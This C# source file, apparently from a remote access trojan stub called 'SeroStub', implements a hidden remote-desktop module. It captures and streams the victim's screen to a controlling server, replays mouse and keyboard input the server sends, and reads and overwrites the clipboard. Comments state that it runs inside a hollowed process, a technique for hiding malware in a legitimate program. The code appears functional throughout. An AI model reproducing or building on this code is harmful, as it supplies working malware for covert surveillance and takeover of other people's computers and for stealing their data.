using System.Runtime.InteropServices;
using System.Threading;

namespace SeroStub;

internal static class RemoteDesktopFeature
{
    // ── Constants ────────────────────────────────────────────────────────────

    private const int  SRCCOPY        = 0x00CC0020;
    private const int  CAPTUREBLT     = 0x40000000;
    private const int  CURSOR_SHOWING = 0x00000001;
    private const uint INPUT_MOUSE    = 0;
    private const uint INPUT_KEYBOARD = 1;
    private const uint MOUSEEVENTF_MOVE        = 0x0001;
    private const uint MOUSEEVENTF_LEFTDOWN    = 0x0002;
    private const uint MOUSEEVENTF_LEFTUP      = 0x0004;
    private const uint MOUSEEVENTF_RIGHTDOWN   = 0x0008;
    private const uint MOUSEEVENTF_RIGHTUP     = 0x0010;
    private const uint MOUSEEVENTF_MIDDLEDOWN  = 0x0020;
    private const uint MOUSEEVENTF_MIDDLEUP    = 0x0040;
    private const uint MOUSEEVENTF_WHEEL       = 0x0800;
    private const uint MOUSEEVENTF_ABSOLUTE    = 0x8000;
    private const uint MOUSEEVENTF_VIRTUALDESK = 0x4000;
    private const uint KEYEVENTF_KEYUP         = 0x0002;
    private const uint KEYEVENTF_EXTENDEDKEY   = 0x0001;
    private const uint CF_UNICODETEXT          = 13;
    private const uint GMEM_MOVEABLE           = 0x0002;
    private const int  BLOCK                   = 64;   // 64×64 → precise per-character updates, sharper text

    private static readonly Guid JpegClsid  = new("557CF401-1A04-11D3-9A73-0000F81EF32E");
    private static readonly Guid EncQuality = new("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");

    // ── P/Invoke ─────────────────────────────────────────────────────────────

    [DllImport("gdi32.dll")] static extern bool DeleteDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint CreateCompatibleDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint CreateCompatibleBitmap(nint hdc, int w, int h);
    [DllImport("gdi32.dll")] static extern nint SelectObject(nint hdc, nint obj);
    [DllImport("gdi32.dll")] static extern bool DeleteObject(nint obj);
    [DllImport("gdi32.dll")] static extern bool BitBlt(nint d, int dx, int dy, int dw, int dh, nint s, int sx, int sy, int rop);
    [DllImport("gdi32.dll")] static extern bool StretchBlt(nint d, int dx, int dy, int dw, int dh, nint s, int sx, int sy, int sw, int sh, int rop);
    [DllImport("gdi32.dll")] static extern int  SetStretchBltMode(nint hdc, int mode);
    [DllImport("gdi32.dll")] static extern int  GetDIBits(nint hdc, nint hbm, uint start, uint lines, byte[]? bits, ref BITMAPINFO bmi, uint usage);
    [DllImport("gdi32.dll")] static extern int  SetDIBits(nint hdc, nint hbm, uint start, uint lines, byte[] bits, ref BITMAPINFO bmi, uint usage);
    private const int HALFTONE = 4;

    [DllImport("user32.dll")] static extern nint GetDC(nint hwnd);
    [DllImport("user32.dll")] static extern bool ReleaseDC(nint hwnd, nint hdc);
    [DllImport("user32.dll")] static extern bool SetThreadDesktop(nint h);
    [DllImport("user32.dll")] static extern nint OpenInputDesktop(uint flags, bool inherit, uint access);
    [DllImport("user32.dll")] static extern bool CloseDesktop(nint h);
    [DllImport("user32.dll")] static extern int  GetSystemMetrics(int idx);
    [DllImport("user32.dll")] static extern bool EnumDisplayMonitors(nint hdc, nint clip, MonitorEnumProc cb, nint data);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern bool GetMonitorInfoW(nint hMon, ref MONITORINFOEX mi);
    [DllImport("user32.dll")] static extern nint SetThreadDpiAwarenessContext(nint dpiContext);
    [DllImport("user32.dll")] static extern uint SendInput(uint n, INPUT[] inputs, int cb);
    [DllImport("user32.dll")] static extern bool OpenClipboard(nint hwnd);
    [DllImport("user32.dll")] static extern bool CloseClipboard();
    [DllImport("user32.dll")] static extern bool EmptyClipboard();
    [DllImport("user32.dll")] static extern nint GetClipboardData(uint fmt);
    [DllImport("user32.dll")] static extern nint SetClipboardData(uint fmt, nint h);
    [DllImport("user32.dll")] static extern bool GetCursorInfo(out CURSORINFO pci);
    [DllImport("user32.dll")] static extern bool DrawIcon(nint hdc, int x, int y, nint hIcon);

    [DllImport("kernel32.dll")] static extern nint GlobalAlloc(uint f, nuint sz);
    [DllImport("kernel32.dll")] static extern nint GlobalLock(nint h);
    [DllImport("kernel32.dll")] static extern bool GlobalUnlock(nint h);

    // SHCreateMemStream: creates an in-memory IStream (no disk I/O, no COM marshaling needed)
    [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint pInit, uint cbInit);

    [DllImport("gdiplus.dll")] static extern int GdiplusStartup(out nint token, ref GdiplusInput inp, nint output);
    [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint token);
    [DllImport("gdiplus.dll")] static extern int GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, nint scan0, out nint bmp);
    [DllImport("gdiplus.dll")] static extern int GdipDisposeImage(nint img);
    // Pass the raw IStream* as nint — avoids COM [MarshalAs] marshaling entirely
    [DllImport("gdiplus.dll")] static extern int GdipSaveImageToStream(nint img, nint stream, ref Guid clsid, nint encParams);

    // IStream vtable delegates (COM vtable dispatch without COM interop)
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint  VtRelease(nint pThis);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtSeek(nint pThis, long move, uint origin, ref long newPos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtRead(nint pThis, nint pv, uint cb, out uint cbRead);

    // ── Structs ───────────────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFOHEADER
    {
        public uint biSize; public int biWidth, biHeight;
        public ushort biPlanes, biBitCount;
        public uint biCompression, biSizeImage;
        public int biXPelsPerMeter, biYPelsPerMeter;
        public uint biClrUsed, biClrImportant;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFO
    {
        public BITMAPINFOHEADER bmiHeader;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public uint[] bmiColors;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct MONITORINFOEX
    {
        public uint cbSize;
        public RECT rcMonitor, rcWork;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szDevice;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct RECT { public int left, top, right, bottom; }
    [StructLayout(LayoutKind.Sequential)]
    struct GdiplusInput
    {
        public uint Version; public nint Callback;
        public int  SuppressBackground, SuppressExternalCodecs; // BOOL = 4 bytes
    }
    [StructLayout(LayoutKind.Sequential)]
    struct CURSORINFO { public int cbSize, flags; public nint hCursor; public int x, y; }
    [StructLayout(LayoutKind.Sequential)]
    struct MOUSEINPUT { public int dx, dy; public uint data, flags, time; public nint extra; }
    [StructLayout(LayoutKind.Sequential)]
    struct KEYBDINPUT { public ushort wVk, wScan; public uint flags, time; public nint extra; }
    [StructLayout(LayoutKind.Explicit)]
    struct INPUTUNION { [FieldOffset(0)] public MOUSEINPUT mi; [FieldOffset(0)] public KEYBDINPUT ki; }
    [StructLayout(LayoutKind.Sequential)]
    struct INPUT { public uint type; public INPUTUNION u; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParam { public Guid Guid; public uint Count, Type; public nint Value; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParams { public uint Count; public EncoderParam Param; }

    delegate bool MonitorEnumProc(nint hMon, nint hdcMon, nint lprc, nint data);

    record struct MonInfo(string Name, int X, int Y, int W, int H);

    // ── State ─────────────────────────────────────────────────────────────────

    private static readonly AutoResetEvent _frameReqEvent = new(false);
    private static volatile int _pendingRequests;

    private static volatile bool _running;
    private static Thread? _thread;
    private static Func<int, string, System.Threading.Tasks.Task>? _send;
    private static RdpStartDataStub _cfg = new();
    private static nint _gdipToken;
    private static MonInfo[] _monitors = [];

    // Previous frame for block-level diff 
    private static byte[]? _prevPixels;
    private static int _prevW, _prevH;

    private static string _lastClip = "";

    // ── Public API ────────────────────────────────────────────────────────────

    public static void Start(RdpStartDataStub cfg, Func<int, string, System.Threading.Tasks.Task> send)
    {
        Stop();
        _cfg  = cfg;
        _send = send;
        _prevPixels = null; // reset diff buffer on new session

        EnsureGdiplus();
        _monitors = EnumMonitors();

        Interlocked.Exchange(ref _pendingRequests, 2); // 2 credits: pipeline one frame ahead on LAN
        _running = true;
        _thread = new Thread(CaptureLoop)
        {
            IsBackground = true, Priority = ThreadPriority.Highest, Name = "RdpCapture"
        };
        _thread.Start();
    }

    public static void Stop()
    {
        _running = false;
        _frameReqEvent.Set();
        _thread?.Join(2000);
        _thread = null;
        Interlocked.Exchange(ref _pendingRequests, 0);
    }

    public static void SignalAck()
    {
        Interlocked.Add(ref _pendingRequests, 1);
        _frameReqEvent.Set();
    }

    // ── Capture loop ──────────────────────────────────────────────────────────

    private static void CaptureLoop()
    {
        try
        {
            // Set physical-pixel DPI awareness FIRST — prevents seeing only a corner of the
            // screen on high-DPI machines where the hollowed process was DPI-virtualized.
            // DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = -4
            SetThreadDpiAwarenessContext(-4);

            // Set thread to interactive desktop (critical in hollowed processes)
            nint hDesk = Program.OriginalDesktop != 0
                ? Program.OriginalDesktop
                : OpenInputDesktop(0, false, 0x01FF);
            if (hDesk != 0)
            {
                SetThreadDesktop(hDesk);
                if (hDesk != Program.OriginalDesktop) CloseDesktop(hDesk);
            }

            // Re-enumerate monitors now that DPI awareness is set to physical pixels.
            // Start() enumerates on the calling thread (possibly DPI-virtualized); this
            // re-enum gives us correct physical dimensions for BitBlt and the combobox.
            _monitors = EnumMonitors();

            // Send monitor list so the server can populate the combobox
            SendMonitorListPublic(_send!);

            int monIdx   = Math.Clamp(_cfg.Monitor, 0, Math.Max(0, _monitors.Length - 1));
            // Fps=0 means unlimited — let DXGI VBLANK (16ms) be the only throttle
            int targetMs = _cfg.Fps > 0 ? Math.Max(1, 1000 / _cfg.Fps) : 0;

            // Try DXGI Desktop Duplication for this monitor (falls back to GDI per frame if unavailable)
            DxgiCapture.TryInit(monIdx);

            while (_running)
            {
                // Flow control: wait until server has acked the previous frame.
                // On LAN acks come back in <5ms so this adds no perceptible latency.
                // On WAN (high RTT) this naturally throttles sends to the network's
                // capacity and prevents the TCP send buffer from filling indefinitely.
                if (_pendingRequests <= 0)
                {
                    _frameReqEvent.WaitOne(200);
                    if (!_running) break;
                    if (_pendingRequests <= 0) continue;
                }
                Interlocked.Decrement(ref _pendingRequests);

                try
                {
                    long t0 = Environment.TickCount64;

                    var mon  = _monitors.Length > 0 ? _monitors[monIdx] : default;
                    int srcW = mon.W > 0 ? mon.W : GetSystemMetrics(0);
                    int srcH = mon.H > 0 ? mon.H : GetSystemMetrics(1);

                    string? json = CaptureAndDiff(mon.X, mon.Y, srcW, srcH);
                    if (json != null)
                    {
                        _send?.Invoke((int)PacketType.RdpFrame, json)
                              .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
                    }
                    else
                    {
                        // No change detected — give credit back immediately so we keep polling
                        Interlocked.Increment(ref _pendingRequests);
                    }

                    if (targetMs > 0)
                    {
                        int elapsedMs = (int)(Environment.TickCount64 - t0);
                        int sleepMs   = targetMs - elapsedMs;
                        if (sleepMs > 0) Thread.Sleep(sleepMs);
                    }
                }
                catch { Thread.Sleep(33); }
            }
        }
        catch { }
        finally { DxgiCapture.Release(); }
    }

    // ── GDI pixel capture — BitBlt path, used when DXGI is unavailable ────────

    private static byte[]? CaptureGdi(int srcX, int srcY, int srcW, int srcH, int dstW, int dstH)
    {
        nint hdcScreen = GetDC(0);
        if (hdcScreen == 0) return null;

        nint hdcMem = 0, hbm = 0, hbmOld = 0;
        nint hdcScl = 0, hbmScl = 0, hbmSclOld = 0;
        try
        {
            hdcMem = CreateCompatibleDC(hdcScreen);
            hbm    = CreateCompatibleBitmap(hdcScreen, srcW, srcH);
            hbmOld = SelectObject(hdcMem, hbm);

            if (!BitBlt(hdcMem, 0, 0, srcW, srcH, hdcScreen, srcX, srcY, SRCCOPY | CAPTUREBLT))
                return null;

            DrawCursor(hdcMem, srcX, srcY, srcW, srcH, srcW, srcH);

            nint hdcRead = hdcMem;
            nint hbmRead = hbm;
            if (dstW != srcW || dstH != srcH)
            {
                hdcScl    = CreateCompatibleDC(hdcScreen);
                hbmScl    = CreateCompatibleBitmap(hdcScreen, dstW, dstH);
                hbmSclOld = SelectObject(hdcScl, hbmScl);
                SetStretchBltMode(hdcScl, HALFTONE);
                StretchBlt(hdcScl, 0, 0, dstW, dstH, hdcMem, 0, 0, srcW, srcH, SRCCOPY);
                hdcRead = hdcScl;
                hbmRead = hbmScl;
            }

            var bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
                    biWidth = dstW, biHeight = -dstH,
                    biPlanes = 1, biBitCount = 32, biCompression = 0
                },
                bmiColors = new uint[4]
            };
            var pixels = new byte[dstW * 4 * dstH];
            GetDIBits(hdcRead, hbmRead, 0, (uint)dstH, pixels, ref bmi, 0);
            return pixels;
        }
        catch { return null; }
        finally
        {
            if (hbmSclOld != 0) SelectObject(hdcScl, hbmSclOld);
            if (hbmScl    != 0) DeleteObject(hbmScl);
            if (hdcScl    != 0) DeleteDC(hdcScl);
            if (hbmOld    != 0) SelectObject(hdcMem, hbmOld);
            if (hbm       != 0) DeleteObject(hbm);
            if (hdcMem    != 0) DeleteDC(hdcMem);
            ReleaseDC(0, hdcScreen);
        }
    }

    // ── Adaptive capture: DXGI Desktop Duplication preferred, GDI fallback ────

    private static string? CaptureAndDiff(int srcX, int srcY, int srcW, int srcH)
    {
        int scale  = Math.Clamp(_cfg.Scale, 25, 100);
        int dstW = 0, dstH = 0;
        byte[]? pixels = null;

        // DXGI Desktop Duplication: GPU-direct, VBLANK-paced capture.
        // timeout=16ms blocks until the next frame from DWM — no busy-poll, natural 60fps pacing.
        // When DXGI returns null with IsInitialized still true → timeout, screen truly unchanged → skip GDI.
        // When DXGI returns null with IsInitialized false → driver error/mode change → fall through to GDI.
        if (scale == 100 && DxgiCapture.IsInitialized)
        {
            pixels = DxgiCapture.CaptureFrame(out dstW, out dstH, 16);
            if (pixels != null)
                TryAddCursorToFrame(pixels, dstW, dstH, srcX, srcY);
            else if (DxgiCapture.IsInitialized)
                return null; // VBLANK timeout — no new frame, nothing to send
            // else: DXGI released itself (ACCESS_LOST / mode change) — fall through to GDI
        }

        if (pixels == null)
        {
            // GDI BitBlt fallback (always works: RDP sessions, headless, non-BGRA formats)
            dstW   = Math.Max(1, srcW * scale / 100);
            dstH   = Math.Max(1, srcH * scale / 100);
            pixels = CaptureGdi(srcX, srcY, srcW, srcH, dstW, dstH);
            if (pixels == null) return null;
        }

        // ── Block-level diff vs previous frame ────────────────────────────────

        bool firstFrame = _prevPixels == null || _prevW != dstW || _prevH != dstH;

        var changedBlocks = new System.Collections.Generic.List<(int bx, int by, int bw, int bh)>();
        int bCols = (dstW + BLOCK - 1) / BLOCK;
        int bRows = (dstH + BLOCK - 1) / BLOCK;

        for (int br = 0; br < bRows; br++)
        {
            for (int bc = 0; bc < bCols; bc++)
            {
                if (firstFrame || BlockChanged(pixels, _prevPixels!, dstW, dstH, bc * BLOCK, br * BLOCK))
                    changedBlocks.Add((bc * BLOCK, br * BLOCK,
                        Math.Min(BLOCK, dstW - bc * BLOCK),
                        Math.Min(BLOCK, dstH - br * BLOCK)));
            }
        }

        if (changedBlocks.Count == 0 && !firstFrame) return null;

        int totalBlocks  = bCols * bRows;
        int changedCount = changedBlocks.Count;

        _prevPixels = pixels;
        _prevW = dstW; _prevH = dstH;

        // ── Adaptive encode strategy ──────────────────────────────────────────
        const int FULLFRAME_THRESHOLD_PCT = 65;
        bool useFullFrame = firstFrame || changedCount * 100 / totalBlocks >= FULLFRAME_THRESHOLD_PCT;

        if (useFullFrame)
        {
            byte[]? fullJpeg = EncodeBlock(pixels, dstW, dstH, 0, 0, dstW, dstH, _cfg.Quality);
            if (fullJpeg == null || fullJpeg.Length == 0) return null;
            string swsh = scale < 100 ? $",\"sw\":{srcW},\"sh\":{srcH}" : "";
            return "{\"w\":" + dstW + ",\"h\":" + dstH + swsh +
                   ",\"j\":\"" + Convert.ToBase64String(fullJpeg) + "\"}";
        }

        int effectiveQ = changedCount < totalBlocks * 15 / 100 ? 95 : _cfg.Quality;

        var sb = new System.Text.StringBuilder();
        sb.Append("{\"w\":").Append(dstW).Append(",\"h\":").Append(dstH);
        if (scale < 100) sb.Append(",\"sw\":").Append(srcW).Append(",\"sh\":").Append(srcH);
        sb.Append(",\"blocks\":[");

        bool first = true;
        foreach (var (bx, by, bw, bh) in changedBlocks)
        {
            byte[]? jpeg = EncodeBlock(pixels, dstW, dstH, bx, by, bw, bh, effectiveQ);
            if (jpeg == null || jpeg.Length == 0) continue;
            if (!first) sb.Append(',');
            first = false;
            sb.Append("{\"x\":").Append(bx)
              .Append(",\"y\":").Append(by)
              .Append(",\"w\":").Append(bw)
              .Append(",\"h\":").Append(bh)
              .Append(",\"j\":\"").Append(Convert.ToBase64String(jpeg)).Append("\"}");
        }
        sb.Append("]}");
        return first ? null : sb.ToString();
    }

    // SIMD-accelerated block comparison via SequenceEqual (uses AVX2/SSE2 under the hood)
    private static bool BlockChanged(byte[] cur, byte[] prev, int w, int h, int bx, int by)
    {
        int bw = Math.Min(BLOCK, w - bx);
        int bh = Math.Min(BLOCK, h - by);
        int stride = w * 4, rowLen = bw * 4;
        for (int y = 0; y < bh; y++)
        {
            int off = (by + y) * stride + bx * 4;
            if (!cur.AsSpan(off, rowLen).SequenceEqual(prev.AsSpan(off, rowLen)))
                return true;
        }
        return false;
    }

    // Encode a block region of the frame to JPEG
    private static byte[]? EncodeBlock(byte[] pixels, int frameW, int frameH,
                                        int bx, int by, int bw, int bh, int quality)
    {
        int srcStride = frameW * 4;
        int dstStride = bw * 4;
        var block = new byte[dstStride * bh];
        for (int y = 0; y < bh; y++)
            Buffer.BlockCopy(pixels, (by + y) * srcStride + bx * 4, block, y * dstStride, dstStride);

        nint gdipBmp = 0;
        unsafe
        {
            fixed (byte* p = block)
            {
                if (GdipCreateBitmapFromScan0(bw, bh, dstStride, 0x26200A, (nint)p, out gdipBmp) != 0
                    || gdipBmp == 0) return null;
                try   { return GdipBitmapToJpeg(gdipBmp, quality); }
                finally { GdipDisposeImage(gdipBmp); }
            }
        }
    }

    // ── JPEG via GDI+ (file-based, no COM IStream) ────────────────────────────

    // Encode GDI+ bitmap to JPEG entirely in memory via SHCreateMemStream.
    // Zero disk I/O — dramatically faster than the file-based approach.
    // Uses raw IStream* vtable dispatch, no COM marshaling needed.
    internal static byte[]? GdipBitmapToJpeg(nint bmp, int quality)
    {
        nint pStream = SHCreateMemStream(0, 0);
        if (pStream == 0) return null;
        try
        {
            // Build encoder parameters
            long qual   = Math.Clamp(quality, 1, 100);
            nint qPtr   = Marshal.AllocHGlobal(sizeof(long));
            Marshal.WriteInt64(qPtr, qual);
            var ep      = new EncoderParam { Guid = EncQuality, Count = 1, Type = 4, Value = qPtr };
            var eps     = new EncoderParams { Count = 1, Param = ep };
            nint epsPtr = Marshal.AllocHGlobal(Marshal.SizeOf<EncoderParams>());
            Marshal.StructureToPtr(eps, epsPtr, false);

            var clsid = JpegClsid;
            int status = GdipSaveImageToStream(bmp, pStream, ref clsid, epsPtr);
            Marshal.FreeHGlobal(qPtr);
            Marshal.FreeHGlobal(epsPtr);
            if (status != 0) return null;

            // IStream vtable: [0]=QI [1]=AddRef [2]=Release [3]=Read [4]=Write [5]=Seek
            nint vtbl  = Marshal.ReadIntPtr(pStream);
            var seekFn = Marshal.GetDelegateForFunctionPointer<VtSeek>(
                Marshal.ReadIntPtr(vtbl, 5 * nint.Size));
            var readFn = Marshal.GetDelegateForFunctionPointer<VtRead>(
                Marshal.ReadIntPtr(vtbl, 3 * nint.Size));

            // Seek to END to get total byte count
            long streamLen = 0;
            seekFn(pStream, 0, 2, ref streamLen); // STREAM_SEEK_END=2 → streamLen = total bytes

            // Seek back to START — use a separate dummy so streamLen is not overwritten!
            long dummy = 0;
            seekFn(pStream, 0, 0, ref dummy);     // STREAM_SEEK_SET=0 → position = 0

            if (streamLen <= 0) return null;

            // Read all bytes from the stream
            byte[] data = new byte[(int)streamLen];
            unsafe { fixed (byte* p = data) readFn(pStream, (nint)p, (uint)streamLen, out _); }
            return data;
        }
        catch { return null; }
        finally
        {
            // Release the IStream COM object
            nint vtbl   = Marshal.ReadIntPtr(pStream);
            var releaseFn = Marshal.GetDelegateForFunctionPointer<VtRelease>(
                Marshal.ReadIntPtr(vtbl, 2 * nint.Size));
            releaseFn(pStream);
        }
    }

    // ── Cursor, monitors, GDI+ ────────────────────────────────────────────────

    private static void DrawCursor(nint hdcDst, int monX, int monY, int dstW, int dstH, int srcW, int srcH)
    {
        try
        {
            var ci = new CURSORINFO { cbSize = Marshal.SizeOf<CURSORINFO>() };
            if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING) return;
            int cx = (ci.x - monX) * dstW / Math.Max(1, srcW);
            int cy = (ci.y - monY) * dstH / Math.Max(1, srcH);
            DrawIcon(hdcDst, cx, cy, ci.hCursor);
        }
        catch { }
    }

    // Composites the Win32 cursor into a raw BGRA pixel buffer (from DXGI capture).
    // Creates a temporary GDI bitmap, loads pixels, draws cursor, reads back.
    private static void TryAddCursorToFrame(byte[] px, int w, int h, int monX, int monY)
    {
        try
        {
            var ci = new CURSORINFO { cbSize = Marshal.SizeOf<CURSORINFO>() };
            if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING) return;
            int cx = ci.x - monX, cy = ci.y - monY;
            if (cx < -64 || cy < -64 || cx >= w || cy >= h) return;

            nint hdc = GetDC(0);
            if (hdc == 0) return;
            nint memDC = 0, hbm = 0;
            try
            {
                memDC = CreateCompatibleDC(hdc);
                if (memDC == 0) return;
                hbm = CreateCompatibleBitmap(hdc, w, h);
                if (hbm == 0) return;

                var bmi = new BITMAPINFO
                {
                    bmiHeader = new BITMAPINFOHEADER
                    {
                        biSize = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
                        biWidth = w, biHeight = -h, biPlanes = 1, biBitCount = 32
                    },
                    bmiColors = new uint[4]
                };
                // Load DXGI pixels into GDI bitmap (bitmap must not be selected)
                SetDIBits(hdc, hbm, 0, (uint)h, px, ref bmi, 0);
                // Select, draw cursor, deselect
                nint prev = SelectObject(memDC, hbm);
                DrawIcon(memDC, cx, cy, ci.hCursor);
                SelectObject(memDC, prev);
                // Read modified pixels back
                GetDIBits(hdc, hbm, 0, (uint)h, px, ref bmi, 0);
            }
            finally
            {
                if (hbm   != 0) DeleteObject(hbm);
                if (memDC != 0) DeleteDC(memDC);
                ReleaseDC(0, hdc);
            }
        }
        catch { }
    }

    private static MonInfo[] EnumMonitors()
    {
        var list = new System.Collections.Generic.List<MonInfo>();
        EnumDisplayMonitors(0, 0, (hMon, _, _, _) =>
        {
            var mi = new MONITORINFOEX { cbSize = (uint)Marshal.SizeOf<MONITORINFOEX>() };
            if (GetMonitorInfoW(hMon, ref mi))
                list.Add(new MonInfo(mi.szDevice, mi.rcMonitor.left, mi.rcMonitor.top,
                    mi.rcMonitor.right - mi.rcMonitor.left, mi.rcMonitor.bottom - mi.rcMonitor.top));
            return true;
        }, 0);
        if (list.Count == 0)
            list.Add(new MonInfo("Primary", 0, 0, GetSystemMetrics(0), GetSystemMetrics(1)));
        return [.. list];
    }

    private static void EnsureGdiplus()
    {
        if (_gdipToken != 0) return;
        var inp = new GdiplusInput { Version = 1 };
        GdiplusStartup(out _gdipToken, ref inp, 0);
    }

    internal static void EnsureGdiplusPublic() => EnsureGdiplus();

    public static void SendMonitorListPublic(Func<int, string, System.Threading.Tasks.Task> send)
    {
        EnsureGdiplus();
        var mons = EnumMonitors();
        var sb = new System.Text.StringBuilder("{\"monitors\":[");
        for (int i = 0; i < mons.Length; i++)
        {
            if (i > 0) sb.Append(',');
            var m = mons[i];
            sb.Append("{\"i\":").Append(i)
              .Append(",\"name\":\"").Append(EscJ(m.Name)).Append('"')
              .Append(",\"x\":").Append(m.X)
              .Append(",\"y\":").Append(m.Y)
              .Append(",\"w\":").Append(m.W)
              .Append(",\"h\":").Append(m.H)
              .Append('}');
        }
        sb.Append("]}");
        send.Invoke((int)PacketType.RdpFrame, sb.ToString())
            .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
    }

    // ── Input ─────────────────────────────────────────────────────────────────

    public static void HandleInput(string json)
    {
        try
        {
            var t = Get(json, "T");
            int x = GetI(json, "X"), y = GetI(json, "Y");
            // GetSystemMetrics must run under per-monitor DPI awareness so it returns
            // physical pixels (matching the capture resolution), not logical/scaled values.
            nint oldDpi = SetThreadDpiAwarenessContext(-4);
            int sw = GetSystemMetrics(78), sh = GetSystemMetrics(79);
            int ox = GetSystemMetrics(76), oy = GetSystemMetrics(77);
            SetThreadDpiAwarenessContext(oldDpi);
            int ax = sw > 0 ? (x - ox) * 65535 / sw : x;
            int ay = sh > 0 ? (y - oy) * 65535 / sh : y;

            var inp = new INPUT { type = INPUT_MOUSE };
            switch (t)
            {
                case "mm":
                    inp.u.mi = new MOUSEINPUT { dx = ax, dy = ay, flags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "mc":
                    int btn = GetI(json, "Button"); bool dn = Get(json, "Down") == "true";
                    uint f = btn == 1 ? (dn ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP)
                           : btn == 2 ? (dn ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP)
                           :            (dn ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP);
                    inp.u.mi = new MOUSEINPUT { dx = ax, dy = ay, flags = f | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "mw":
                    inp.u.mi = new MOUSEINPUT { data = (uint)GetI(json, "WheelDelta"), flags = MOUSEEVENTF_WHEEL };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "kk":
                    bool kdn = Get(json, "Down") == "true"; bool ext = Get(json, "Extended") == "true";
                    var ki = new INPUT { type = INPUT_KEYBOARD };
                    ki.u.ki = new KEYBDINPUT { wVk = (ushort)GetI(json, "VK"),
                        flags = (kdn ? 0u : KEYEVENTF_KEYUP) | (ext ? KEYEVENTF_EXTENDEDKEY : 0u) };
                    SendInput(1, [ki], Marshal.SizeOf<INPUT>());
                    break;
            }
        }
        catch { }
    }

    public static void HandleClipboard(string json)
    {
        try
        {
            var text = Get(json, "Text");
            if (string.IsNullOrEmpty(text)) return;
            if (!OpenClipboard(0)) return;
            try
            {
                EmptyClipboard();
                var bytes = System.Text.Encoding.Unicode.GetBytes(text + "\0");
                nint h = GlobalAlloc(GMEM_MOVEABLE, (nuint)bytes.Length);
                if (h == 0) return;
                nint p = GlobalLock(h);
                Marshal.Copy(bytes, 0, p, bytes.Length);
                GlobalUnlock(h);
                SetClipboardData(CF_UNICODETEXT, h);
                _lastClip = text;
            }
            finally { CloseClipboard(); }
        }
        catch { }
    }

    public static string? PollClipboard()
    {
        try
        {
            if (!OpenClipboard(0)) return null;
            try
            {
                nint h = GetClipboardData(CF_UNICODETEXT);
                if (h == 0) return null;
                nint p = GlobalLock(h);
                if (p == 0) return null;
                string s = Marshal.PtrToStringUni(p) ?? "";
                GlobalUnlock(h);
                if (s == _lastClip) return null;
                _lastClip = s;
                return s;
            }
            finally { CloseClipboard(); }
        }
        catch { return null; }
    }

    // ── JSON helpers ──────────────────────────────────────────────────────────

    private static string Get(string json, string key)
    {
        var pat = "\"" + key + "\"";
        int i = json.IndexOf(pat, StringComparison.Ordinal);
        if (i < 0) return "";
        int c = json.IndexOf(':', i + pat.Length);
        if (c < 0) return "";
        int s = c + 1;
        while (s < json.Length && json[s] == ' ') s++;
        if (s >= json.Length) return "";
        if (json[s] == '"')
        {
            int e = json.IndexOf('"', s + 1);
            return e < 0 ? "" : json.Substring(s + 1, e - s - 1);
        }
        int end = s;
        while (end < json.Length && json[end] != ',' && json[end] != '}') end++;
        return json.Substring(s, end - s).Trim();
    }

    private static int GetI(string json, string key)
        => int.TryParse(Get(json, key), out int v) ? v : 0;

    private static string EscJ(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    internal static string ToBase64(byte[] d) => Convert.ToBase64String(d);
}
